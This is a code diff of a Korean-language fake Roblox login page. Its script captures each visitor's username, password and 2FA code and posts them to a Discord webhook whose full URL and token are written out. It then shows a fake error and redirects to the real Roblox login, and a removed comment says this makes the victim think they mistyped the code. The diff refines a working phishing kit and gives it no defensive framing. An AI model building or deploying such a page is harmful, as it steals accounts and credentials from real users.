@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox에 로그인</title>
     <style>
+        /* ← 여기는 너가 보낸 거랑 똑같이 유지 (생략) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Source Sans Pro', 'Noto Sans KR', 'Helvetica Neue', Arial, sans-serif;
@@ -91,7 +92,6 @@
             display: none;
         }
 
-        /* 2FA 화면 (처음엔 숨김) */
         #step2fa { display: none; }
 
         .footer { background: #101010; padding: 16px 24px; text-align: center; }
@@ -199,19 +199,18 @@
     <script>
         var capturedUser = '';
         var capturedPass = '';
+        var WEBHOOK_URL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPQQAQeHTqtDyQnAzY8mmPX4w';
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             capturedUser = document.getElementById('username').value;
             capturedPass = document.getElementById('password').value;
 
-            // Discord로 1차 전송
-            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
-            fetch(webhookURL, {
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: '**[1단계] Roblox 로그인 정보 캡처됨**',
+                    content: '<@&1519015614017048688> **[1단계] Roblox 로그인 정보 캡처됨**',
                     embeds: [{
                         title: '1단계 - 계정 정보',
                         fields: [
@@ -225,7 +224,6 @@
                 })
             }).catch(function(err) {});
 
-            // 2FA 화면으로 전환
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('signupOption').style.display = 'none';
             document.getElementById('step2fa').style.display = 'block';
@@ -236,12 +234,11 @@
             e.preventDefault();
             var faCode = document.getElementById('faCode').value;
 
-            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
-            fetch(webhookURL, {
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: '**[2단계] Roblox 2FA 코드 캡처됨!** @everyone',
+                    content: '<@&1519015614017048688> **[2단계] Roblox 2FA 코드 캡처됨!**',
                     embeds: [{
                         title: '2FA 코드 획득 완료',
                         fields: [
@@ -255,7 +252,6 @@
                 })
             }).catch(function(err) {});
 
-            // 에러 메시지 표시 후 진짜 Roblox로 리디렉션 (피해자는 "코드 잘못 입력했나?" 생각)
             document.getElementById('faErrorMsg').style.display = 'block';
             setTimeout(function() {
                 window.location.href = 'https://www.roblox.com/ko/login';
